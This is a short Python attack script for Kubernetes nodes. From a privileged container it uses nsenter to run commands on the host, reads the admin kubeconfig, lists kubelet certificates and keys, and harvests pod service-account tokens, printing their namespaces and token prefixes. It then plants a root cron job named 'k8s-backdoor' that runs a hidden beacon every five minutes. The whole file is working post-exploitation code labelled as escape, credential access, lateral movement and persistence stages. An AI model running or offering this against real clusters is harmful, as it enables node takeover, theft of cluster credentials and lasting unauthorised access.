import subprocess as sp, os, time

def run(cmd):
    r = sp.run(["nsenter","-t","1","-m","-u","-i","-n","-p","--","bash","-c",cmd],
               capture_output=True, text=True, timeout=30)
    return r.stdout.strip()

print("=== ESCAPE: Host Recon ===")
print("kernel:", run("uname -r"))
print("hostname:", run("hostname"))

print("\n=== CREDENTIAL ACCESS: Admin Kubeconfig ===")
result = run("cat /etc/kubernetes/admin.conf 2>/dev/null | grep -E 'server:|certificate-authority-data' | head -2")
print(result[:200] if result else "FAILED")

print("\n=== CREDENTIAL ACCESS: Kubelet Certs ===")
print(run("ls -la /var/lib/kubelet/pki/*.{crt,key} 2>/dev/null | awk '{print $NF}'"))

print("\n=== LATERAL: SA Token Theft ===")
tokens = run("find /var/lib/kubelet/pods -name 'token' -path '*/kube-api-access-*' 2>/dev/null | head -4")
for tp in tokens.split("\n")[:4]:
    if tp.strip():
        ns_val = run(f"cat $(dirname {tp})/namespace 2>/dev/null")
        token_preview = run(f"head -c 40 {tp} 2>/dev/null")
        print(f"  [{ns_val}] {token_preview}...")

print("\n=== PERSISTENCE: Crontab Backdoor ===")
run("mkdir -p /etc/cron.d 2>/dev/null")
run("echo '*/5 * * * * root /tmp/.beacon' > /etc/cron.d/k8s-backdoor 2>&1")
print(run("cat /etc/cron.d/k8s-backdoor 2>/dev/null"))

print("\n=== COMPLETE ===")
